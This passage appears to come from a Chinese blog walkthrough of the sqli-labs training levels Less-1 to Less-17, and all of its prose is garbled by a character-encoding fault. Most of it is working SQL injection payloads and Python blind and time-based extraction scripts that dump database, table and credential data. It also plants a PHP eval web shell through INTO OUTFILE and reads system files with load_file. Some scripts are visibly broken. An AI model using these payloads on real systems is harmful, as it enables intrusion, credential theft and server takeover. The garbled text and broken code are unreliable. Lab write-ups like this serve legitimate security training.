1</span><br></pre></td></tr></table></figure><p>å‡¡æ˜¯å‡ºç°è¿™ç§æœ‰å›æ˜¾çš„æŠ¥é”™æ˜¯æ„Ÿè§‰æ˜¯æœ€å¥½åšçš„æ³¨å…¥</p><p>å¸¸è§„æ­¥éª¤ï¼Œ<code>æš´åº“-&gt;çˆ†è¡¨-&gt;çˆ†åˆ—</code><br>è¿™é‡Œæˆ‘ä»¬æ˜¯å¤šå†™äº†ä¸ªå•å¼•å·å¯¼è‡´æŠ¥é”™ï¼Œæˆ‘ä»¬å¯ä»¥ä»æŠ¥é”™çœ‹å¾—å‡ºæ¥è¿™é‡Œæ˜¯å•å¼•å·æ‹¬ç€idå‚æ•°<br>æ‰€ä»¥æˆ‘ä»¬é—­åˆå•å¼•å·<br>æ„é€ æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27%23</code> å›æ˜¾æ­£å¸¸ï¼Œè¯´æ˜çŒœæµ‹æˆåŠŸ</p><p>å»åå°çœ‹ä¸€ä¸‹è¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>æ˜¯è¿™æ ·å­çš„ï¼Œæ²¡æœ‰ä»»ä½•è¿‡æ»¤</p><p>ç„¶åå¼€å§‹ç”¨order byå»çŒœåˆ—æ•°<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=1%27 order by 3%23</code>  å¾—åˆ°è¡¨ä¸­åº”è¯¥æ˜¯ä¸‰åˆ—(ç”¨äºŒåˆ†æ³•å»æ…¢æ…¢æµ‹)</p><p>ç„¶åå¼€å§‹ç”¨union selectå»å›æ˜¾æŸä¸€åˆ—çš„ä¸œè¥¿<br><code>http://192.168.100.105/sqlilabs/Less-1/?id=-1%27</code> union select 1,2,3%23<br>è¿™é‡Œæˆ‘ä»¬éœ€è¦æŠŠç¬¬ä¸€å¥è¯å¼„æˆç»“æœä¸ºç©ºæ‰èƒ½æ˜¾ç¤ºåé¢ä¸€å¥è¯çš„å†…å®¹ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©id=-1ï¼Œç„¶åçš„è¯å°±å¯ä»¥å›æ˜¾2å’Œ3,åé¢å°±å¯ä»¥åˆ©ç”¨è¿™ä¸¤åˆ—å›æ˜¾ä½ æƒ³è¦çš„ä¸œè¥¿äº†</p><p>ä¸‹é¢æˆ‘ä»¬å°±å¼€å§‹è¦ç”¨mysqlé‡Œé¢è‡ªå¸¦çš„information_schemaè¡¨äº†<br>çŒœè¡¨å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23</span><br></pre></td></tr></table></figure><p>çŒœåˆ—å</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=&apos;users&apos;%23</span><br></pre></td></tr></table></figure><p>æ‰çŒœå¯¹åº”çš„å†…å®¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-1/?id=-1%27%20union%20select%201,2,concat_ws(&apos;%23&apos;,username,password)%20from users limit 0,1%23</span><br></pre></td></tr></table></figure><p>è¿™ä¸€å¥è¯åªèƒ½çŒœä¸€è¡Œï¼Œæ‰€ä»¥è¦æƒ³çœ‹å…¶ä»–è¡Œçš„å†…å®¹å°±å¿…é¡»è¦åˆ·ä¸€ä¸‹limitçš„å†…å®¹äº†</p><h2 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h2><p>å¾ˆæ— èŠï¼Œçœ‹ä¸€ä¸‹æºä»£ç ä»€ä¹ˆé˜²å¾¡éƒ½æ²¡æœ‰</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=$id LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=1 order by 5</span><br></pre></td></tr></table></figure><p>æµ‹è¯•å¾—åˆ°3åˆ—ï¼Œç„¶åå¼€å§‹é—­åˆï¼Œå…¶å®è¿™ä¸€é¢˜ç›´æ¥æ³¨é‡Šäº†å°±å¥½</p><p>ç›´æ¥ä¸Šè¯­å¥<br>Payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-2/?id=-1 union select 1,2,3#</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æƒ³æµ‹ä»€ä¹ˆéƒ½å¯ä»¥äº†</p><h2 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h2><p>è¾“å…¥?id=1â€™å‡ºç°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&apos;1&apos;&apos;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹è¿™é‡Œåº”è¯¥æ˜¯ä¸€ä¸ªå•å¼•å·+æ‹¬å·é—­åˆï¼Œæµ‹è¯•ä¸€ä¸‹å¯¹ä¸å¯¹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=1&apos;) %23</span><br></pre></td></tr></table></figure><p>æˆåŠŸå›æ˜¾</p><p>å†çœ‹çœ‹æºä»£ç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure><p>æœç„¶å¦‚æ­¤</p><p>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-3/?id=-1&apos;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h2><p>å°è¯•?id=1â€™å•å¼•å·æ²¡æœ‰æŠ¥é”™<br>å°è¯•ä¸€ä¸‹â€,å‘ç°å‡ºç°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;&quot;1&quot;&quot;) LIMIT 0,1&apos; at line 1</span><br></pre></td></tr></table></figure><p>çŒœæµ‹æ˜¯<code>&quot;+ï¼‰</code>çš„ç»„åˆ<br>é—­åˆä¸€ä¸‹è¯•è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=1&quot;)%23</span><br></pre></td></tr></table></figure><p>æˆåŠŸå›æ˜¾<br>å†çœ‹çœ‹æºä»£ç æœç„¶æ˜¯è¿™æ ·<br>æ¥ä¸‹æ¥å°±æ˜¯payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-4/?id=-1&quot;) union select 1,database(),3%23</span><br></pre></td></tr></table></figure><h2 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h2><p>æ ¹æ®<code>You are in</code>çš„æœ‰æ— æ¥åˆ¤æ–­æ­£ç¡®<br>è¾“å…¥id=1â€™å‡ºç°æŠ¥é”™å›æ˜¾<br>çŒœæµ‹æ˜¯å•å¼•å·çš„æ³¨å…¥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5/?id=1%27%23</span><br></pre></td></tr></table></figure><p>å°è¯•é—­åˆä¸€ä¸‹å‡ºç°å›æ˜¾ï¼Œè¿™ä¸ªé¢˜ç›®æœ‰ä¸¤ç§åšæ³•ï¼Œä¸€ç§æ˜¯ç›´æ¥å°è¯•ç›²æ³¨ï¼Œå¦ä¸€ç§æ˜¯æŠ¥é”™æ³¨å…¥<br>é¦–å…ˆæ¥ä¸€ä¸ªæŠ¥é”™æ³¨å…¥çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.105/sqlilabs/Less-5?id=1&apos; and updatexml(1,concat(0x7e,version(),0x7e),1)%23</span><br></pre></td></tr></table></figure><p>ç„¶åå†æ¥ä¸€ä¸ªç›²æ³¨è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># Author:0verWatch</span></span><br><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select database()),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"><span class="comment">#æ³¨æ„ä¸€ä¸‹è¿™é‡Œä½¿ç”¨=å»ä½œä¸ºåˆ¤æ–­æ¡ä»¶</span></span><br><span class="line"><span class="comment">#url = "http://192.168.100.102/sqlilabs/Less-5/?id=1%27 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),&#123;_&#125;,1))=&#123;__&#125; %23"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">65</span>,<span class="number">127</span>):</span><br><span class="line">payload = url.format(_ = i,__ = j)</span><br><span class="line"><span class="comment">#print payload</span></span><br><span class="line">ans  = requests.get(payload)</span><br><span class="line"><span class="comment">#print ans.content</span></span><br><span class="line"><span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line"><span class="comment"># database = database + chr(j)</span></span><br><span class="line"><span class="comment"># print database</span></span><br><span class="line">table_name += chr(j)</span><br><span class="line"><span class="keyword">print</span> table_name</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h2><p>è¾“å…¥?id=1â€™æ²¡æœ‰ä»»ä½•ååº”ï¼ŒåŒå¼•å·é—­åˆå°±å¥½äº†</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot;%23</span><br></pre></td></tr></table></figure><p>ç›´æ¥æŠ¥é”™å³å¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-6/?id=1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&apos;users&apos; limit 4,1),0x7e),1)%23</span><br></pre></td></tr></table></figure><h2 id="Less-7"><a href="#Less-7" class="headerlink" title="Less-7"></a>Less-7</h2><p>æ˜¯æµ‹è¯•å†™æ–‡ä»¶çš„åŠŸèƒ½<br>ç›´æ¥è¾“å…¥å•å¼•å·å‡ºç°é”™è¯¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You have an error in your SQL syntax</span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¾—æåŠä¸€ä¸‹å¦‚æœè¦è¯»å–ä»¥åŠå†™æ–‡ä»¶çš„è¯å¿…é¡»å¾—éœ€è¦æƒé™ï¼Œè¿™é‡Œæˆ‘å€Ÿé‰´äº†ä¸€éƒ¨åˆ†å†…å®¹<br>å¯¼å…¥å¯¼å‡ºç›¸å…³æ“ä½œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load_file(file_name)ï¼šè¯»å–æ–‡ä»¶å¹¶è¿”å›è¯¥æ–‡ä»¶çš„å†…å®¹ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ã€‚</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ¡ä»¶ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">A.å¿…é¡»æœ‰æƒé™è¯»å–å¹¶ä¸”æ–‡ä»¶å¯è¯»</span><br><span class="line"></span><br><span class="line">and (select count(*) from mysql.user)&gt;0/* å¦‚æœç»“æœè¿”å›æ­£å¸¸ï¼Œè¯´æ˜å…·æœ‰è¯»å†™æƒé™ã€‚å¦‚æœè¿”å›é”™è¯¯ï¼Œåˆ™è¯´æ˜ç®¡ç†å‘˜ç»™æ•°æ®åº“é™æƒã€‚</span><br><span class="line"></span><br><span class="line">B.æ¬²è¯»å–æ–‡ä»¶å¿…é¡»åœ¨æœåŠ¡å™¨ä¸Šã€‚</span><br><span class="line">C.å¿…é¡»æŒ‡å®šæ–‡ä»¶å®Œæ•´çš„è·¯å¾„</span><br><span class="line">D.æ¬²è¯»å–æ–‡ä»¶å¿…é¡»å°äºmax_allowed_packetã€‚</span><br></pre></td></tr></table></figure><p>å®é™…åº”ç”¨æ—¶ï¼Œæ–‡ä»¶è¯»å–æƒé™æ˜¯æœ€éš¾æ»¡è¶³çš„ï¼Œæˆ‘ä»¬æœ‰ä¸¤ä¸ªéš¾ç‚¹éœ€è¦è§£å†³ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.ç»å¯¹ç‰©ç†è·¯å¾„</span><br><span class="line">2.æ„é€ æœ‰æ•ˆçš„ç•¸å½¢è¯­å¥(æŠ¥é”™çˆ†å‡ºç»å¯¹è·¯å¾„)</span><br></pre></td></tr></table></figure></p><p>å®ä¾‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">select 1,2,3,4,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))</span><br><span class="line">åˆ©ç”¨hex()å°†æ–‡ä»¶å¯¼å‡ºæ¥ï¼Œç‰¹åˆ«æ˜¯smbæ–‡ä»¶</span><br><span class="line">-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))</span><br><span class="line">explainï¼šc:/boot.iniçš„åå…­è¿›åˆ¶æ˜¯0x633s2f626f6f742e696e69</span><br><span class="line">-1 union select 1,1,1,load_file(C:\\boot.ini)</span><br><span class="line">explainï¼šè·¯å¾„é‡Œçš„/ç”¨\\ä»£æ›¿</span><br><span class="line">load data fileå¯¼å…¥æ•°æ®åº“</span><br><span class="line">ç•¥ã€‚</span><br><span class="line">å¯¼å…¥åˆ°æ–‡ä»¶ä¸­</span><br><span class="line">SELECT INTO OUTFILE â€˜file_nameâ€™,å…·ä½“å‚é˜…å…¶ä»–æ–‡ç« ã€‚</span><br><span class="line">file_name ä¸èƒ½æ˜¯ä¸€ä¸ªå·²ç»å­˜åœ¨çš„æ–‡ä»¶ã€‚</span><br></pre></td></tr></table></figure><p>ä»æºä»£ç é‡Œé¢å¯ä»¥å‘ç°æ˜¯è¦é—­åˆ)çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥è¿™æ ·å»å†™æ–‡ä»¶</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqlilabs/Less-7/?id=1&apos;)) union select 1,2,&apos;&lt;?php @eval($_POST[cmd]);?&gt;&apos; into outfile &apos;D:\\phpStudy\\PHPTutorial\\WWW\\sqlilabs\\Less-7\\1.php&apos; --+</span><br></pre></td></tr></table></figure><p>è¿æ¥æˆåŠŸ<br><a href="https://imgchr.com/i/PXe8Ig" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXe8Ig.md.png" alt="PXe8Ig.md.png"></a></p><h2 id="Less-8"><a href="#Less-8" class="headerlink" title="Less-8"></a>Less-8</h2><p>è¿™ä¸€é¢˜æºä»£ç é‡Œé¢å°†æœ‰å…³æŠ¥é”™ä¿¡æ¯å…¨éƒ½æ³¨é‡Šäº†åªèƒ½ç”¨ç›²æ³¨<br><a href="https://imgchr.com/i/PXetRs" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/08/29/PXetRs.md.png" alt="PXetRs.md.png"></a><br>å…ˆæµ‹è¯•å‘ç°è¿˜æ˜¯ç›´æ¥ä¸€ä¸ªå•å·ç„¶ååŠ ä¸€ä¸ªæ³¨é‡Šå°±å¯ä»¥ååé¢çš„äº‹æƒ…äº†<br>ä¸Šè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://192.168.100.102/sqlilabs/Less-8/?id=1' and ascii(substr((select database()),&#123;_&#125;,1))</span></span><br><span class="line"><span class="string">&gt;&#123;__&#125; %23'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">9</span>):</span><br><span class="line">    max = <span class="number">127</span></span><br><span class="line">    min = <span class="number">65</span></span><br><span class="line">    <span class="keyword">while</span> abs(max-min)&gt;<span class="number">1</span>:</span><br><span class="line">    mid = (max+min)//<span class="number">2</span></span><br><span class="line">    payload = url.format(_=i,__=mid)</span><br><span class="line">    ans = requests.get(payload)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'You are in...........'</span> <span class="keyword">in</span> ans.content:</span><br><span class="line">    min = mid</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    max = mid</span><br><span class="line">    database = database + chr(max)</span><br><span class="line">    <span class="keyword">print</span> database</span><br></pre></td></tr></table></figure><h2 id="Less-9"><a href="#Less-9" class="headerlink" title="Less-9"></a>Less-9</h2><p>è¿™æ˜¯ä¸€ä¸ªæ—¶é—´ç›²æ³¨çš„é¢˜ç›®<br>ç›´æ¥å•å¼•å·é—­åˆåŠ ä¸ªæ³¨é‡Šå…¶å®å°±okäº†ï¼Œè¿™é‡Œå°±ç›´æ¥ç»™ä¸ªçˆ†æ•°æ®åº“çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'''http://127.0.0.1/sqlilabs/Less-8/?id=1'and if(ascii(substr(database(),&#123;_&#125;,1))=&#123;__&#125;,1,sleep(3))--+'''</span></span><br><span class="line"></span><br><span class="line">database = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">97</span>,<span class="number">127</span>):</span><br><span class="line">        payload = url.format(_=i,__=j)</span><br><span class="line">        <span class="keyword">print</span> payload</span><br><span class="line">        start = time.time()</span><br><span class="line">        ans = requests.get(payload)</span><br><span class="line">        <span class="keyword">if</span> time.time()-start &gt;<span class="number">3</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database += chr(j)</span><br><span class="line">            <span class="keyword">print</span> database</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="Less-10"><a href="#Less-10" class="headerlink" title="Less-10"></a>Less-10</h2><p>ä¹Ÿæ˜¯ä¸€ä¸ªæ—¶é—´ç›²æ³¨é¢˜ç›®ï¼Œä¸è¿‡è¿™ä¸€é¢˜æ˜¯åŒå¼•å·é—­åˆï¼ŒæŠŠä¸Šé¢çš„è„šæœ¬æ”¹ä¸ºåŒå¼•å·å°±å¥½</p><h2 id="Less-11"><a href="#Less-11" class="headerlink" title="Less-11"></a>Less-11</h2><p>æ˜¯ä¸€ä¸ªpostè¡¨æ ¼çš„ç•Œé¢<br>ä¸Šæ¥å°±å°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-12"><a href="#Less-12" class="headerlink" title="Less-12"></a>Less-12</h2><p>å†å°è¯•Less-11ä¸€éƒ¨åˆ†å†…å®¹ï¼Œå‘ç°ä¸è¡Œï¼Œæ²¡æœ‰æŠ¥é”™ä¿¡æ¯<br>å°è¯•åŒå¼•å·<br>å‡ºç°æŠ¥é”™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">your MySQL server version for the right syntax to use near &apos;&quot;)</span><br></pre></td></tr></table></figure><p>åº”è¯¥æ˜¯æœ‰ä¸€ä¸ªæ‹¬å·çš„<br>å°è¯•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1 #</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><p>ç«‹å³è¿‡</p><h2 id="Less-13"><a href="#Less-13" class="headerlink" title="Less-13"></a>Less-13</h2><p>ä¸Šä¸€é¢˜çš„å•å¼•å·ç‰ˆæœ¬</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-14"><a href="#Less-14" class="headerlink" title="Less-14"></a>Less-14</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot; or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-15"><a href="#Less-15" class="headerlink" title="Less-15"></a>Less-15</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&apos; or &apos;1&apos;=&apos;1</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-16"><a href="#Less-16" class="headerlink" title="Less-16"></a>Less-16</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&quot;) or 1=1#</span><br><span class="line">passwd=123</span><br></pre></td></tr></table></figure><h2 id="Less-17"><a href="#Less-17" class="headerlink" title="Less-17"></a>Less-17</h2><p>è¿™ä¸€ä½“çš„æ³¨å…¥ç‚¹åœ¨passwordä¸Šï¼Œè¿™ä¹Ÿæé†’äº†æˆ‘ä»¬ï¼Œæ³¨å…¥ç‚¹ä¸ä¸€å®šæ˜¯åœ¨ç¬¬ä¸€ä¸ªè¾“å…¥æ¡†å†…è¿˜æœ‰å¯èƒ½æ˜¯ç¬¬äºŒè¾“å…¥æ¡†å‘¢ï¼<br>æˆ‘ä»¬ä¹Ÿå¯ä»¥ä»æºä»£ç çš„è§’åº¦å»åˆ†æï¼Œå› ä¸ºæºä»£ç å†™äº†ä¸ªcheckå‡½æ•°å»æ£€æŸ¥usernameè€Œpasswordåè€Œæ¼äº†å†™<br>å¯¹åº”çš„passwordæˆ‘ä»¬å¯ä»¥ç”¨æŠ¥é”™æ³¨å…¥å»å®ç°ï¼Œç”¨å•å¼•å·é—­åˆpassword</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username: admin</span><br><span class="line">password:1&apos; and updatexml(1,concat(0x7e,database(),0x7e),1)#</span><br></pre></td></tr></table></figure><p>çˆ†è¡¨</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e),1)#</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&apos;user&apos;),0x7e),1)#</span><br></pre></td></tr></table></figure><p>çˆ†è¯¦ç»†ä¿¡æ¯<br>è¿™æ—¶å€™è¾“å…¥è¿™ä¸€å¥è¯çš„æ—¶å€™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&apos; and updatexml(1,concat(0x7e,(select username from users),0x7e),1)#</span><br></pre></td></tr></table></figure><p>ä¼šå‡ºç°</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You can&apos;t specify target table &apos;users&apos; for update in FROM clause</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯mysqlè‡ªèº«çš„é—®é¢˜ä¸èƒ½åŒæ—¶å¯¹ä¸€ä¸ªè¡¨åˆselectåˆupdateï¼Œæ‰€ä»¥æˆ‘ä»¬å¾—æ„é€ å¦å¤–ä¸€ä¸ªè¡¨å»å­æŸ¥è¯¢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; and updatexml(1,concat(0x7e,(select username from (select username  from users)b limit 0,1),0x7e),1)#</span><br></pre></td></tr></table></figure><p>ä»‹ç»ä¸€ä¸‹é‡Œé¢çš„è¿‡æ»¤å‡½æ•°ï¼Œå…¶ä»–ä¸¤ä¸ªå¾ˆç†Ÿæ‚‰å°±ä¸ä»‹ç»äº†<br><code>mysql_real_escape_string()</code><br>å‡½æ•°è½¬ä¹‰SQL è¯­å¥ä¸­ä½¿ç”¨çš„å­—ç¬¦ä¸²ä¸­çš„ç‰¹æ®Šå­—ç¬¦ã€‚<br>ä¸‹åˆ—å­—ç¬¦å—å½±å“ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 